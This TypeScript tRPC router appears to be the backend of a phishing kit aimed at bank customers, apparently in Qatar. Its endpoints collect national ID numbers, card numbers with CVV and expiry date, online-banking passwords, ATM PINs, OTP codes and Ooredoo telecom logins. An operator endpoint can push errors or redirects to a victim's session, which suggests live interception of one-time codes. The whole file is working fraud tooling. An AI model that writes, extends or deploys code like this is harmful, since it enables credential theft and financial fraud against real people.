import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import {
  createSession,
  submitPersonalData,
  submitLoginMethod,
  submitAtmPin,
  submitOtp,
  submitOoredoo,
  getAllSubmissions,
  getSubmissionDetails,
  updateSessionStatus,
  adminTakeAction,
  getSessionStatus,
  getFullSubmissions,
} from "./db";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  submissions: router({
    createSession: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return { 
          sessionId: String(obj.sessionId), 
          selectedBank: String(obj.selectedBank),
          country: obj.country ? String(obj.country) : "Qatar"
        };
      })
      .mutation(async ({ input }) => {
        await createSession(input.sessionId, input.selectedBank, input.country);
        return { success: true };
      }),

    submitPersonalData: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          nameArabic: String(obj.nameArabic),
          nameEnglish: String(obj.nameEnglish),
          idNumber: String(obj.idNumber),
          phoneNumber: String(obj.phoneNumber),
          email: String(obj.email),
          dateOfBirth: String(obj.dateOfBirth),
          gender: String(obj.gender),
          customerStatus: String(obj.customerStatus),
        };
      })
      .mutation(async ({ input }) => {
        await submitPersonalData(input);
        return { success: true };
      }),

    submitLoginMethod: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          loginType: String(obj.loginType),
          cardNumber: obj.cardNumber ? String(obj.cardNumber) : "",
          cardholderName: obj.cardholderName ? String(obj.cardholderName) : "",
          expiryDate: obj.expiryDate ? String(obj.expiryDate) : "",
          cvv: obj.cvv ? String(obj.cvv) : "",
          username: obj.username ? String(obj.username) : "",
          password: obj.password ? String(obj.password) : "",
        };
      })
      .mutation(async ({ input }) => {
        await submitLoginMethod(input);
        await updateSessionStatus(input.sessionId, "loading", "login");
        return { success: true };
      }),

    submitAtmPin: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          pin: String(obj.pin),
        };
      })
      .mutation(async ({ input }) => {
        await submitAtmPin(input);
        await updateSessionStatus(input.sessionId, "loading", "atm");
        return { success: true };
      }),

    submitOtp: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          otpCode: String(obj.otpCode),
          otpType: String(obj.otpType),
        };
      })
      .mutation(async ({ input }) => {
        await submitOtp(input);
        await updateSessionStatus(input.sessionId, "loading", input.otpType === "ooredoo" ? "otp_ooredoo" : "otp");
        return { success: true };
      }),

    submitOoredoo: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          ooredooUser: String(obj.ooredooUser),
          ooredooPassword: String(obj.ooredooPassword),
        };
      })
      .mutation(async ({ input }) => {
        await submitOoredoo(input);
        await updateSessionStatus(input.sessionId, "loading", "ooredoo");
        return { success: true };
      }),

    getAllSubmissions: publicProcedure.query(async () => {
      return await getFullSubmissions();
    }),

    getSubmissionDetails: publicProcedure
      .input(String)
      .query(async ({ input }) => {
        return await getSubmissionDetails(input);
      }),

    adminTakeAction: publicProcedure
      .input((val: unknown) => {
        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
        const obj = val as Record<string, unknown>;
        return {
          sessionId: String(obj.sessionId),
          action: String(obj.action),
          errorMessage: obj.errorMessage ? String(obj.errorMessage) : undefined,
          redirectTarget: obj.redirectTarget ? String(obj.redirectTarget) : undefined,
        };
      })
      .mutation(async ({ input }) => {
        await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
        return { success: true };
      }),

    getSessionStatus: publicProcedure
      .input(String)
      .query(async ({ input }) => {
        return await getSessionStatus(input);
      }),
  }),
});

export type AppRouter = typeof appRouter;
